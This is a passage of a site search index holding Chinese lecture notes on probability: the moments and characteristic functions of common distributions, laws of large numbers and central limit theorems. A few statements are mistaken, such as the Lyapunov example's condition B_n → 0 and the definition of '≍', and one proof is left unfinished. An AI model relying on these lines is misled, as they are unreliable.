\\frac{\\lambda^k}{k!} e^{-\\lambda} \\\\ &amp;= e^{-\\lambda} \\sum_{k=0}^\\infty \\frac{(\\lambda e^{it})^k}{k!} \\\\ &amp;= e^{-\\lambda} e^{\\lambda e^{it}} \\\\ &amp;= e^{\\lambda(e^{it} - 1)} \\end{aligned} \\] </li> </ul> <p>\u51e0\u4f55\u5206\u5e03</p> \\[ X \\sim G(p), P(X = k) = (1-p)^{k-1} p \\] \\[ E(X) = \\sum_{k=1}^\\infty k (1-p)^{k-1} p = \\frac{1}{p} \\] <p>\u8d85\u51e0\u4f55\u5206\u5e03</p> \\[ X \\sim H(N, M, n), P(X = k) = \\frac{C_M^k C_{N-M}^{n-k}}{C_N^n} \\] <ul> <li> <p>\u671f\u671b</p> <p>\u4ee4 \\(X_i\\) \u8868\u793a\u7b2c \\(i\\) \u6b21\u62bd\u68c0\u65f6\u7684\u6b21\u54c1\u4e2a\u6570\u3002</p> \\[ X_i = \\begin{cases}     1, &amp; p = \\frac{M}{N} \\\\     0, &amp; 1 - p = \\frac{N-M}{N} \\end{cases} \\] <p>\u5f97\u5230 \\(E(X_i) = \\dfrac{M}{N}\\)\uff0c\u56e0\u6b64</p> \\[ E(X) = \\sum_{k=0}^n E(X_i) = n \\frac{M}{N} \\] \u4e0d\u653e\u56de\u62bd\u6837\u6bcf\u6b21\u62bd\u6837\u540c\u5206\u5e03\u4e0d\u72ec\u7acb <p>\u8bbe \\(A_i\\) \u8868\u793a\u7b2c \\(i\\) \u6b21\u62bd\u68c0\u65f6\u62bd\u5230\u6b21\u54c1\u3002</p> \\[ \\begin{aligned} p(A_2) &amp;= p(A_1) p(A_2 | A_1) + p(\\overline{A_1}) p(A_2 | \\overline{A_1}) \\\\ &amp;= \\frac{M}{N} \\times \\frac{M-1}{N-1} + \\frac{N-M}{N} \\times \\frac{M}{N-1} \\\\ &amp;= \\frac{M^2 - M + NM - M^2}{N(N-1)} \\\\ &amp;= \\frac{M}{N} \\end{aligned} \\] <p>\u7531\u6570\u5b66\u5f52\u7eb3\u6cd5\u53ef\u77e5\uff0c\\(p(A_i) = \\dfrac{M}{N}\\)\u3002</p> </li> </ul>"},{"location":"math/prob_theory/chapter3/#_30","title":"\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf","text":"<p>\u5747\u5300\u5206\u5e03</p> \\[ X \\sim U(a, b), p(x) = \\frac{1}{b-a} \\] <ul> <li> <p>\u671f\u671b</p> \\[ EX = \\int_a^b \\frac{x}{b-a} \\ \\mathrm{d}x = \\frac{a+b}{2} \\] </li> <li> <p>\u65b9\u5dee</p> \\[ \\begin{aligned} VarX &amp;= E(X^2) - (EX)^2 \\\\ &amp;= \\int_a^b \\frac{x^2}{b-a} \\ \\mathrm{d}x - \\left(\\frac{a+b}{2}\\right)^2 \\\\ &amp;= \\frac{b^3 - a^3}{3(b-a)} - \\left(\\frac{a+b}{2}\\right)^2 \\\\ &amp;= \\frac{(b-a)^2}{12} \\end{aligned} \\] </li> <li> <p>\u7279\u5f81\u51fd\u6570</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= \\int_a^b \\frac{e^{itx}}{b-a} \\ \\mathrm{d}x \\\\ &amp;= \\frac{e^{itb} - e^{ita}}{it(b-a)} \\end{aligned} \\] </li> </ul> <p>\u6307\u6570\u5206\u5e03</p> \\[ X \\sim E(\\lambda), p(x) = \\lambda e^{-\\lambda x}, x &gt; 0 \\] <ul> <li> <p>\u671f\u671b</p> \\[ \\begin{aligned} EX &amp;= \\int_0^\\infty \\lambda x e^{-\\lambda x} \\ \\mathrm{d}x \\\\ &amp;= -\\int_0^\\infty x \\ \\mathrm{d}e^{-\\lambda x} \\\\ &amp;= \\left. -x e^{-\\lambda x} \\right|_0^\\infty + \\int_0^\\infty e^{-\\lambda x} \\ \\mathrm{d}x \\\\ &amp;= \\frac{1}{\\lambda} \\\\ \\end{aligned} \\] </li> <li> <p>\u65b9\u5dee</p> \\[ \\begin{aligned} VarX &amp;= E(X^2) - (EX)^2 \\\\ &amp;= \\frac{2}{\\lambda^2} - \\frac{1}{\\lambda^2} \\\\ &amp;= \\frac{1}{\\lambda^2} \\end{aligned} \\] \u8fc7\u7a0b \\[ \\begin{aligned} E(X^2) &amp;= \\int_0^\\infty \\lambda x^2 e^{-\\lambda x} \\ \\mathrm{d}x \\\\ &amp;= -\\int_0^\\infty x^2 \\ \\mathrm{d}e^{-\\lambda x} \\\\ &amp;= \\left. -x^2 e^{-\\lambda x} \\right|_0^\\infty + \\int_0^\\infty 2x e^{-\\lambda x} \\ \\mathrm{d}x \\\\ &amp;= \\frac{2}{\\lambda^2} \\end{aligned} \\] </li> <li> <p>\u7279\u5f81\u51fd\u6570</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= \\int_0^\\infty \\lambda e^{-\\lambda x} e^{itx} \\ \\mathrm{d}x \\\\ &amp;= \\int_0^\\infty \\lambda e^{-(\\lambda - it)x} \\ \\mathrm{d}x \\\\ &amp;= -\\lambda \\left. \\frac{e^{-(\\lambda - it)x}}{\\lambda - it} \\right|_0^\\infty \\\\ &amp;= \\frac{\\lambda}{\\lambda - it} \\end{aligned} \\] </li> </ul> <p>\u6b63\u6001\u5206\u5e03</p> \\[ X \\sim N(\\mu, \\sigma^2), p(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\] <ul> <li> <p>\u671f\u671b</p> \\[ EX = \\int_{-\\infty}^{\\infty} \\frac{x}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\ \\mathrm{d}x = \\mu \\] </li> <li> <p>\u65b9\u5dee</p> \\[ \\begin{aligned} VarX &amp;= E(X^2) - (EX)^2 \\\\ &amp;= \\sigma^2 + \\mu^2 - \\mu^2 \\\\ &amp;= \\sigma^2 \\end{aligned} \\] \u8fc7\u7a0b \\[ \\begin{aligned} E(X^2) &amp;= \\int_{-\\infty}^{\\infty} \\frac{x^2}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= \\int_{-\\infty}^{\\infty} \\frac{(x-\\mu+\\mu)^2}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= \\int_{-\\infty}^{\\infty} \\frac{(x-\\mu)^2}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\ \\mathrm{d}x + \\int_{-\\infty}^{\\infty} \\frac{2\\mu(x-\\mu)}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\ \\mathrm{d}x + \\int_{-\\infty}^{\\infty} \\frac{\\mu^2}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= \\sigma^2 + 0 + \\mu^2 \\\\ &amp;= \\sigma^2 + \\mu^2 \\end{aligned} \\] </li> <li> <p>\u77e9</p> <p>\u8bbe \\(X \\sim N(0, \\sigma^2)\\)\uff0c\u5219</p> \\[ E(X^{2k+1}) = 0, E(X^{2k}) = (2k-1)!! \\sigma^{2k} \\] <p>\u8bc1\u660e</p> \\[ \\begin{aligned} E(X^{2k}) &amp;= \\int_{-\\infty}^{\\infty} \\frac{x^{2k}}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{x^2}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= -\\int_{-\\infty}^{\\infty} \\frac{x^{2k-1}\\sigma}{\\sqrt{2\\pi}} \\ \\mathrm{d}e^{-\\frac{x^2}{2\\sigma^2}} \\\\ &amp;= -\\left. \\frac{x^{2k-1}\\sigma}{\\sqrt{2\\pi}} e^{-\\frac{x^2}{2\\sigma^2}} \\right|_{-\\infty}^{\\infty} + \\int_{-\\infty}^{\\infty} \\frac{(2k-1)x^{2k-2}\\sigma^2}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{x^2}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= (2k-1)\\sigma^2 E(X^{2k-2}) \\\\ &amp;= (2k-1)!! \\sigma^{2k} \\end{aligned} \\] <p>\u5bf9\u4e8e \\(X^{2k+1}\\)\uff0c\u7531\u4e8e \\(X\\) \u662f\u5076\u51fd\u6570\uff0c\u56e0\u6b64</p> \\[ E(X^{2k+1}) = 0 \\] </li> <li> <p>\u7279\u5f81\u51fd\u6570</p> <p>Info</p> <p>\u5bf9\u4e8e \\(X \\sim N(0, 1)\\)\uff0c\u6709</p> \\[ \\int_{-\\infty}^\\infty \\frac{1}{\\sqrt{2\\pi}} e^{-\\frac{x^2}{2}} \\ \\mathrm{d}x = 1 \\] <p>\u5f97\u5230</p> \\[ \\int_{-\\infty}^\\infty e^{-\\frac{x^2}{2}} \\ \\mathrm{d}x = \\sqrt{2\\pi} \\] <p>\u5bf9\u4e8e \\(X \\sim N(\\mu, \\sigma^2)\\)\uff0c\u6709</p> \\[ \\begin{aligned} \\varphi(t) &amp;= E(e^{itX}) \\\\ &amp;= \\int_{-\\infty}^\\infty \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}} e^{itx} \\ \\mathrm{d}x \\\\ &amp;= \\int_{-\\infty}^\\infty \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2 - 2i\\sigma^2tx}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^\\infty e^{-\\frac{(x-\\mu - i\\sigma^2t)^2 + \\sigma^4t^2 - 2\\mu i\\sigma^2t}{2\\sigma^2}} \\ \\mathrm{d}x \\\\ &amp;= \\frac{1}{\\sqrt{2\\pi}} e^{\\mu it - \\frac{1}{2}\\sigma^2t^2} \\int_{-\\infty}^\\infty e^{-\\frac{1}{2}(\\frac{x-\\mu - i\\sigma^2t}{\\sigma})^2} \\ \\mathrm{d}\\frac{x-\\mu - i\\sigma^2t}{\\sigma} \\\\ &amp;= e^{\\mu it - \\frac{1}{2}\\sigma^2t^2} \\end{aligned} \\] <p>\u5f97\u5230</p> \\[ \\varphi(t) = e^{\\mu it - \\frac{1}{2}\\sigma^2t^2} \\] <p>\u5bf9\u4e8e\u6807\u51c6\u6b63\u6001\u5206\u5e03\uff0c\u6709 \\(\\varphi(t) = e^{-\\frac{1}{2}t^2}\\)\u3002</p> </li> </ul>"},{"location":"math/prob_theory/chapter4/","title":"\u6982\u7387\u6781\u9650\u5b9a\u7406","text":""},{"location":"math/prob_theory/chapter4/#_2","title":"\u7ecf\u5178\u6982\u7387\u6781\u9650\u5b9a\u7406","text":"<p>\u4e0b\u9762\u4e09\u4e2a\u5b9a\u7406\u53ea\u6d89\u53ca Bernoulli \u8bd5\u9a8c\uff0c\\(X \\sim B(n, p)\\)\u3002</p> \\[ \\begin{aligned} P(X = k) &amp;= \\binom{n}{k} p^k (1 - p)^{n - k} \\\\ E(X) &amp;= np \\\\ Var(X) &amp;= np(1 - p) \\end{aligned} \\]"},{"location":"math/prob_theory/chapter4/#bernoulli","title":"Bernoulli \u5927\u6570\u5b9a\u5f8b","text":"<p>\u4f9d\u6982\u7387\u6536\u655b</p> <p>\u8bbe \\(X_n, n \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\\(X\\) \u662f\u53e6\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5982\u679c\u5bf9\u4e8e\u4efb\u610f\u7684 \\(\\varepsilon &gt; 0\\)\uff0c\u6709</p> \\[ P(\\omega: \\left| X_n(\\omega) - X(\\omega) \\right| &gt; \\varepsilon) \\rightarrow 0, \\quad n \\rightarrow \\infty \\] <p>\u5219\u79f0 \\(X_n\\) \u4f9d\u6982\u7387\u6536\u655b\u5230 \\(X\\)\uff0c\u8bb0\u4f5c \\(X_n \\xrightarrow{P} X\\)\u3002</p> <p>\u8bbe \\(0 &lt; p &lt; 1\\)\uff0c\\(S_n \\sim B(n, p)\\)\uff0c\u5219</p> \\[ P(\\omega: \\left| \\frac{S_n(\\omega)}{n} - p \\right| &gt; \\varepsilon) \\rightarrow 0, \\quad n \\rightarrow \\infty \\] <p>\u5373 \u9891\u7387\u63a5\u8fd1\u6982\u7387\u771f\u503c \u7684\u6570\u5b66\u89e3\u91ca\u3002\u5373 \\(\\dfrac{S_n}{n}\\) \u4f9d\u6982\u7387\u6536\u655b\u5230 \\(p\\)\u3002</p> \\[ \\frac{S_n}{n} \\xrightarrow{P} p, \\quad n \\rightarrow \\infty \\] <p>Info</p> <p>\u4e0d\u80fd\u4f7f\u7528 \\(\\varepsilon - N\\) \u8bed\u8a00\u6765\u63cf\u8ff0\uff0c\u56e0\u4e3a\u968f\u673a\u53d8\u91cf\u53d6\u503c\u8303\u56f4\u548c \\(n\\) \u65e0\u5173\u3002</p> \\[ P(\\omega: \\left| \\frac{S_n(\\omega)}{n} - p \\right| &gt; \\varepsilon) = \\sum_{k: \\left| \\frac{k}{n} - p \\right| &gt; \\varepsilon} \\binom{n}{k} p^k (1 - p)^{n - k} &gt; 0 \\] <p>\u5373\u603b\u4f1a\u53d1\u751f \\(\\left| \\frac{S_n}{n} - p \\right| &gt; \\varepsilon\\)\u3002</p>"},{"location":"math/prob_theory/chapter4/#de-moivre-laplace","title":"de Moivre-Laplace \u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":"<p>\u4f9d\u5206\u5e03\u6536\u655b</p> <p>\u8bbe \\(X_n, n \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\u76f8\u5e94\u5206\u5e03\u51fd\u6570\u4e3a \\(F_n(x)\\)\uff0c\\(X\\) \u662f\u53e6\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)\\)\uff0c\u5982\u679c\u5bf9\u4e8e\u4efb\u610f\u7684 \\(F(x)\\) \u7684\u8fde\u7eed\u70b9 \\(x\\)\uff0c\u6709</p> \\[ F_n(x) \\rightarrow F(x), \\quad n \\rightarrow \\infty \\] <p>\u5219\u79f0 \\(X_n\\) \u4f9d\u5206\u5e03\u6536\u655b\u5230 \\(X\\)\uff0c\u8bb0\u4f5c \\(X_n \\xrightarrow{D} X\\) \u6216 \\(F_n \\xrightarrow{D} F\\)\u3002</p> <p>\u5047\u8bbe \\(S_n \\sim B(n, p)\\)\uff0c\u5219</p> \\[ P(\\frac{S_n - np}{\\sqrt{np(1 - p)}} \\leq x) \\asymp \\int^x_{-\\infty} \\frac{1}{\\sqrt{2\\pi}} e^{-\\frac{t^2}{2}} \\ \\mathrm{d} t, \\quad n \\rightarrow \\infty \\] \\(\\asymp\\) \u610f\u4e3a\u6e10\u8fdb\u76f8\u7b49 <p>\u5373 \\(f \\asymp g \\Leftrightarrow \\exists C, D &gt; 0\\)\uff0c\u4f7f\u5f97 \\(C|g| \\leq |f| \\leq D|g|\\)\u3002</p> <p>\u5176\u4e2d \\(\\dfrac{S_n - np}{\\sqrt{np(1 - p)}}\\) \u79f0\u4e3a \u89c4\u8303\u5316\u968f\u673a\u53d8\u91cf\uff0c\u8bb0\u4f5c \\(Z_n\\)\uff0c\u6ee1\u8db3 \\(EZ_n = 0, VarZ_n = 1\\)\uff1b\u7b49\u5f0f\u53f3\u4fa7\u4e3a \u6807\u51c6\u6b63\u6001\u5206\u5e03 \u7684\u5206\u5e03\u51fd\u6570 \\(\\Phi(x)\\)\u3002\u5373</p> \\[ F_{Z_n}(x) \\xrightarrow{D} \\Phi(x), \\quad n \\rightarrow \\infty \\] <p>\u5373\u6ee1\u8db3 Bernoulli \u4e8c\u9879\u5206\u5e03\u7684\u89c4\u8303\u5316\u968f\u673a\u53d8\u91cf\u5206\u5e03\u6e10\u8fdb\u4e8e\u6807\u51c6\u6b63\u6001\u5206\u5e03\u3002</p> <p>\u5e94\u7528</p> \\[ \\begin{aligned} P(a \\leq S_n \\leq b) &amp;= P(\\frac{a - np}{\\sqrt{np(1 - p)}} \\leq \\frac{S_n - np}{\\sqrt{np(1 - p)}} \\leq \\frac{b - np}{\\sqrt{np(1 - p)}}) \\\\ &amp;\\asymp \\Phi(\\frac{b - np}{\\sqrt{np(1 - p)}}) - \\Phi(\\frac{a - np}{\\sqrt{np(1 - p)}}) \\end{aligned} \\] \u8bc1\u660e\uff08\\(p=1/2\\) \u7684\u60c5\u51b5\uff09 <p>\u51fa\u53d1\u70b9</p> \\[ P(a \\leq \\frac{S_n - np}{\\sqrt{np(1 - p)}} \\leq b) = \\sum_{k: a \\leq \\frac{k - np}{\\sqrt{np(1 - p)}} \\leq b} \\binom{n}{k} p^k (1 - p)^{n - k} \\] <p>:TODO:</p> <p>\uff08szg\uff1a\u611f\u5174\u8da3\u7684\u4e86\u89e3\uff09</p>"},{"location":"math/prob_theory/chapter4/#poisson","title":"Poisson \u6781\u9650\u5b9a\u7406","text":"<p>\u8bbe \\(S_n \\sim B(n, p_n)\\)\uff0c\u82e5 \\(np_n \\rightarrow \\lambda\\)\uff0c\u5219</p> \\[ P(S_n = k) \\rightarrow \\frac{\\lambda^k}{k!} e^{-\\lambda}, \\quad n \\rightarrow \\infty \\] <p>\u8bc1\u660e</p> <p>\u7531 \\(np_n \\rightarrow \\lambda\\)\uff0c\u53ef\u77e5 \\(p_n = \\frac{\\lambda}{n} + o(\\frac{1}{n})\\)\u3002</p> \\[ \\begin{align} P(S_n = k) =&amp; {n \\choose k}p_n^k(1-p_n)^{n-k} \\\\ =&amp; \\frac{1}{k!} \\cdot n(n-1)\\cdots(n-k+1)\\cdot \\frac{1}{n^k}\\cdot (np_k)^k \\cdot (1 - \\frac{\\lambda}{n} + o(\\frac{1}{n}))^{n-k} \\\\ =&amp; \\left[(1-\\frac{1}{n})(1-\\frac{2}{n})\\cdots(1-\\frac{k-1}{n})\\right] \\left[\\frac{\\lambda^k}{k!}\\right] \\left[(1-\\frac{\\lambda}{n})^{n-k}\\right] \\\\ \\to &amp; \\frac{\\lambda^k}{k!} e^{-\\lambda}, \\quad n\\to \\infty \\end{align} \\]"},{"location":"math/prob_theory/chapter4/#_3","title":"\u7ecf\u5178\u6781\u9650\u5b9a\u7406\u7684\u63a8\u5e7f","text":""},{"location":"math/prob_theory/chapter4/#bernoulli_1","title":"Bernoulli \u5927\u6570\u5b9a\u7406\u7684\u63a8\u5e7f","text":""},{"location":"math/prob_theory/chapter4/#chebyshev","title":"Chebyshev \u5927\u6570\u5b9a\u5f8b","text":"<p>Chebyshev \u4e0d\u7b49\u5f0f</p> <p>\u8bbe \\(X\\) \u662f\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f\u7684 \\(\\varepsilon &gt; 0\\)\uff0c\u6709</p> \\[ P(\\left|X - EX \\right| &gt; \\epsilon) \\leq \\frac{VarX}{\\varepsilon^2} \\] \u8bc1\u660e Bernoulli \u5927\u6570\u5b9a\u7406 \\[ \\begin{aligned} P(\\left| \\frac{S_n}{n} - p \\right| &gt; \\varepsilon) &amp;= P(\\left| S_n - np \\right| &gt; n\\varepsilon) \\\\ &amp;\\leq \\frac{np(1 - p)}{n^2\\varepsilon^2} \\\\ &amp;= \\frac{p(1 - p)}{n\\varepsilon^2} \\\\ &amp;\\rightarrow 0, \\quad n \\rightarrow \\infty \\end{aligned} \\] <p>\u5047\u8bbe \\(X_k, k \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\u4e14 \\(EX_k = \\mu_k\\)\uff0c\u8bbe \\(S_n = \\sum_{k=1}^nX_k\\)\uff0c\u82e5</p> \\[ \\frac{VarS_n}{n^2} \\rightarrow 0, \\quad n \\rightarrow \\infty  \\] <p>\u5219</p> \\[ \\frac{S_n}{n} - \\frac{\\sum_{k=1}^n\\mu_k}{n} \\xrightarrow{P} 0, \\quad n \\rightarrow \\infty \\] <p>\u7279\u522b\u7684\uff0c\u82e5 \\(EX_k = \\mu\\)\uff0c\u5219</p> \\[ \\frac{S_n}{n} \\xrightarrow{P} \\mu, \\quad n \\rightarrow \\infty \\] <p>\u8bc1\u660e</p> <p>\u9996\u5148\u6709</p> \\[ ES_n = E\\sum_{k=1}^nX_k = \\sum_{k=1}^nEX_k = \\sum_{k=1}^n\\mu_k \\] <p>\u5bf9\u4e8e \\(\\forall \\varepsilon &gt; 0\\)\uff0c\u6709</p> \\[ \\begin{aligned} P(\\left| \\frac{S_n}{n} - \\frac{\\sum_{k=1}^n\\mu_k}{n} \\right| &gt; \\varepsilon) &amp;= P(\\left| S_n - ES_n \\right| &gt; n\\varepsilon) \\\\ &amp;\\leq \\frac{VarS_n}{n^2\\varepsilon^2}, \\quad \\text{Chebyshev \u4e0d\u7b49\u5f0f} \\\\ &amp;\\rightarrow 0, \\quad n \\rightarrow \\infty, \\quad \\text{\u524d\u63d0\u6761\u4ef6} \\end{aligned} \\] <p>\u63ed\u793a\u4e86 \u6837\u672c\u7684\u5747\u503c\u6e10\u8fd1\u4e8e\u603b\u4f53\u7684\u5747\u503c\uff0c\u4e14\u6ca1\u6709\u72ec\u7acb\u6027\u8981\u6c42\u3002</p> <p>\u7f3a\u70b9\uff1a\u8981\u6c42\u65b9\u5dee\u5b58\u5728\u3002</p> <p>\u5e94\u7528</p> <p>\u8bbe \\(\\xi_k, k \\geq 1\\) \u662f\u4e00\u5217\u72ec\u7acb\u7684\u968f\u673a\u53d8\u91cf\uff0c\u6709 \\(\\xi_1 \\equiv 0\\)\uff0c\u4e14\u5f53 \\(k \\geq 2\\) \u6709</p> \\[ \\begin{aligned} P(\\xi_k = k) = P(\\xi_k = -k) &amp;= \\frac{1}{2k \\log k} \\\\ P(\\xi_k = 0) &amp;= 1 - \\frac{1}{k \\log k} \\end{aligned} \\] <p>\u8bb0 \\(S_n = \\sum_{k=1}^n\\xi_k\\)\uff0c\u8bc1\u660e</p> \\[ \\frac{S_n}{n} \\xrightarrow{P} 0, \\quad n \\rightarrow \\infty \\] \u8bc1\u660e <p>\u7531\u4e8e \\(\\xi_k\\) \u4e0d\u662f\u540c\u5206\u5e03\uff0c\u6545\u4f7f\u7528 Chebyshev \u5927\u6570\u5b9a\u5f8b\u3002</p> <p>\u6709 \\(E\\xi_k = 0\\)\uff0c\\(Var\\xi_k = \\frac{k}{\\log k}\\)\uff0c\u6545</p> \\[ \\frac{VarS_n}{n^2} = \\frac{1}{n^2} \\sum_{k=1}^n\\frac{k}{\\log k} \\sim \\frac{1}{n^2} \\frac{n^2}{\\log n} \\rightarrow 0, \\quad n \\rightarrow \\infty \\] <p>\u6545</p> \\[ \\frac{S_n}{n} \\xrightarrow{P} 0, \\quad n \\rightarrow \\infty \\]"},{"location":"math/prob_theory/chapter4/#khintchine","title":"Khintchine \u5927\u6570\u5b9a\u5f8b","text":"<p>\u5047\u8bbe \\(X_k, k \\geq 1\\) \u662f\u4e00\u5217\u72ec\u7acb\u540c\u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\uff0c\\(EX_k = \\mu\\)\uff0c\u8bbe \\(S_n = \\sum_{k=1}^nX_k\\)\uff0c\u5219</p> \\[ \\frac{S_n}{n} \\xrightarrow{P} \\mu, \\quad n \\rightarrow \\infty \\]"},{"location":"math/prob_theory/chapter4/#de-moivre-laplace_1","title":"de Moivre-Laplace \u4e2d\u5fc3\u6781\u9650\u5b9a\u7406\u7684\u63a8\u5e7f","text":""},{"location":"math/prob_theory/chapter4/#levy-feller","title":"Levy-Feller \u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":"<p>\u8bbe \\(X_k, k \\geq 1\\) \u662f\u4e00\u5217\u72ec\u7acb\u540c\u5206\u5e03\u7684\u968f\u673a\u53d8\u91cf\uff0c\\(EX_k = \\mu, VarX_k = \\sigma^2\\)\uff0c\u8bbe \\(S_n = \\sum_{k=1}^nX_k\\)\uff0c\u5219</p> \\[ P(\\frac{S_n - n\\mu}{\\sigma\\sqrt{n}} \\leq x) \\rightarrow \\Phi(x), \\quad \\forall x, n \\rightarrow \\infty \\] <p>\u5373</p> \\[ \\frac{S_n - n\\mu}{\\sigma\\sqrt{n}} \\xrightarrow{D} N(0, 1), \\quad n \\rightarrow \\infty \\] <p>\u8bf4\u660e\u6d4b\u91cf\u8bef\u5dee\u53ef\u4ee5\u7528\u6b63\u6001\u5206\u5e03\u63cf\u8ff0\u3002</p>"},{"location":"math/prob_theory/chapter4/#lyapunov","title":"Lyapunov \u4e2d\u5fc3\u6781\u9650\u5b9a\u7406","text":"<p>\u8bbe \\(X_k, k \\geq 1\\) \u662f\u4e00\u5217\u72ec\u7acb\u968f\u673a\u53d8\u91cf\uff0c\\(EX_k = \\mu_k, VarX_k = \\sigma_k^2\\)\uff0c\u8bbe</p> \\[ S_n = \\sum_{k=1}^nX_k, B_n = \\sum_{k=1}^n\\sigma_k^2 \\] <p>\u82e5</p> \\[ \\begin{aligned} B_n &amp;\\rightarrow \\infty, \\\\ E|X_k|^3 &amp;&lt; \\infty, \\quad \\forall k \\\\ \\frac{\\sum_{k=1}^nE|X_k|^3}{B_n^{3/2}} &amp;\\rightarrow 0, \\quad n \\rightarrow \\infty \\end{aligned} \\] <p>\u5219</p> \\[ P(\\frac{\\sum_{k=1}^n(\\xi_k - \\mu_k)}{\\sqrt{B_n}} \\leq x) \\rightarrow \\Phi(x), \\quad \\forall x, n \\rightarrow \\infty \\] <p>\u5373</p> \\[ \\frac{\\sum_{k=1}^n(\\xi_k - \\mu_k)}{\\sqrt{B_n}} \\xrightarrow{D} N(0, 1), \\quad n \\rightarrow \\infty \\] <p>Example</p> <p>\u5047\u8bbe \\(\\xi_k, k \\geq 1\\) \u662f\u4e00\u5217\u72ec\u7acb\u968f\u673a\u53d8\u91cf\uff0c\u4e14</p> \\[ P(\\xi_k = 1) = p_k, \\quad P(\\xi_k = 0) = 1 - p_k, \\quad 0 &lt; p_k &lt; 1 \\] <p>\u82e5</p> \\[ B_n = \\sum_{k=1}^n p_k(1 - p_k) \\rightarrow 0, \\quad n \\rightarrow \\infty \\] <p>\u5219</p> \\[ \\frac{\\sum_{k=1}^n(\\xi_k - p_k)}{\\sqrt{\\sum_{k=1}^n p_k(1 - p_k)}} \\xrightarrow{D} N(0, 1), \\quad n \\rightarrow \\infty \\]"},{"location":"math/prob_theory/chapter4/#_4","title":"\u4f9d\u6982\u7387\u6536\u655b","text":"<p>\u8bbe \\(X_n, n \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\\(X\\) \u662f\u53e6\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5982\u679c\u5bf9\u4e8e\u4efb\u610f\u7684 \\(\\varepsilon &gt; 0\\)\uff0c\u6709</p> \\[ P(\\omega: \\left| X_n(\\omega) - X(\\omega) \\right| &gt; \\varepsilon) \\rightarrow 0, \\quad n \\rightarrow \\infty \\] <p>\u5219\u79f0 \\(X_n\\) \u4f9d\u6982\u7387\u6536\u655b\u5230 \\(X\\)\uff0c\u8bb0\u4f5c \\(X_n \\xrightarrow{P} X\\)\u3002\uff08\\(X\\) \u53ef\u4ee5\u662f\u5e38\u6570\uff09</p>"},{"location":"math/prob_theory/chapter4/#_5","title":"\u5224\u522b\u6cd5\u5219","text":"<p>\u82e5\u5b58\u5728 \\(r &gt; 0\\)\uff0c\u4f7f\u5f97</p> \\[ E|X_n - X|^r \\rightarrow 0, \\quad n \\rightarrow \\infty \\] <p>\u5219 \\(X_n \\xrightarrow{P} X\\)\u3002</p>"},{"location":"math/prob_theory/chapter4/#_6","title":"\u57fa\u672c\u6027\u8d28","text":"<ol> <li> <p>\u552f\u4e00\u6027</p> <p>\u82e5 \\(X_n \\xrightarrow{P} X\\)\uff0c\\(X_n \\xrightarrow{P} Y\\)\uff0c\u5219 \\(X = Y\\)\u3002</p> </li> <li> <p>\u8fd0\u7b97\u6027\u8d28\uff1a\u82e5 \\(X_n \\xrightarrow{P} X\\)\uff0c\\(Y_n \\xrightarrow{P} Y\\)\uff0c\u5219</p> <ul> <li>\\(X_n + Y_n \\xrightarrow{P} X + Y\\)</li> <li>\\(X_nY_n \\xrightarrow{P} XY\\)</li> <li>\u82e5 \\(Y \\neq 0\\)\uff0c\u5219 \\(\\dfrac{X_n}{Y_n} \\xrightarrow{P} \\dfrac{X}{Y}\\)</li> <li>\u82e5 \\(g\\) \u8fde\u7eed\uff0c\u5219 \\(g(X_n) \\xrightarrow{P} g(X)\\)</li> </ul> </li> </ol>"},{"location":"math/prob_theory/chapter4/#_7","title":"\u4f9d\u5206\u5e03\u6536\u655b","text":"<p>\u8bbe \\(X_n, n \\geq 1\\) \u662f\u4e00\u5217\u968f\u673a\u53d8\u91cf\uff0c\u76f8\u5e94\u5206\u5e03\u51fd\u6570\u4e3a \\(F_n(x)\\)\uff0c\\(X\\) \u662f\u53e6\u4e00\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)\\)\uff0c\u5982\u679c\u5bf9\u4e8e\u4efb\u610f\u7684 \\(F(x)\\) \u7684\u8fde\u7eed\u70b9 \\(x\\)\uff0c\u6709</p> \\[ F_n(x) \\rightarrow F(x), \\quad n \\rightarrow \\infty \\] <p>\u5219\u79f0 \\(X_n\\) \u4f9d\u5206\u5e03\u6536\u655b\u5230 \\(X\\)\uff0c\u8bb0\u4f5c \\(X_n 